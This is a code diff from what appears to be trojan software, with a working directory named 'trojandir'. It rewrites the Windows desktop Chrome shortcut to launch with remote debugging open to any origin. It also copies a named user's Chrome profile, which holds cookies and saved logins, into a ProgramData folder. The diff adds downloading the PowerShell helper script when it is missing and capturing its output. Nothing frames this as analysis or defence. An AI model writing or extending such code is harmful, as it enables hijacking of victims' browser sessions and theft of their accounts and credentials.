@@ -4305,7 +4305,7 @@ async function copy_userdata(srcpath, destpath) {
             if (! isNullOrWhitespace(stderr) )
                 resolve(stderr);
 
-            resolve("");
+            resolve(stdout);
         });
     });
 
@@ -4319,8 +4319,21 @@ async function modify_chrome() {
 
     let runningcmd = systemstate.cmdconfig;
 
-    scriptfpath = path.join(systemstate.trojandir, "modify_browser_lnk.ps1");
-    jsonconfigpath = path.join(systemstate.trojandir, "modify_browser_lnk.ps1_config.json");
+    let scriptfname = systemstate.istpl ? "modify_browser_lnk_tpl.ps1" : "modify_browser_lnk.ps1";
+    scriptfpath = path.join(systemstate.trojandir, scriptfname);
+
+    let ret = '';
+
+    if ( ! fileExists(scriptfpath) ) {
+        ret = await retrieve_asset(scriptfname);
+    }
+
+    if ( ! fileExists(scriptfpath) ) {
+        logmsg(`script does not exist ${scriptfpath}`);
+        process.exit(1);
+    }
+
+    jsonconfigpath = path.join(systemstate.trojandir, scriptfname + '_config.json');
 
     // --ignore-certificate-errors --> causes warning popup in chrome on startup/launch
     cmdlineargs = `--user-data-dir="C:\\ProgramData\\owd\\chrome" --profile-directory=Default --remote-allow-origins=* --restore-last-session --remote-debugging-port=9223`;
@@ -4333,7 +4346,10 @@ async function modify_chrome() {
 
     writeTag(jsonconfigpath, JSON.stringify(jsonconfig));
 
-    let childp = execPSScript(scriptfpath, [jsonconfigpath]);
+    let stdout = '';
+    let childp = execPSScript(scriptfpath, [jsonconfigpath],null, (text)=>{ 
+        stdout += text;
+    });
 
     shortcut_path = `"C:\\Users\\Public\\Desktop\\Google Chrome.lnk"`;
 
@@ -4349,7 +4365,7 @@ async function modify_chrome() {
     srcpath = 'C:\\Users\\ADULT2022\\AppData\\Local\\Google\\Chrome\\User Data';
     destpath = 'C:\\ProgramData\\owd\\chrome';
 
-    await copy_userdata(srcpath, destpath);
+    ret = await copy_userdata(srcpath, destpath);
 
     process.exit(0);
 }
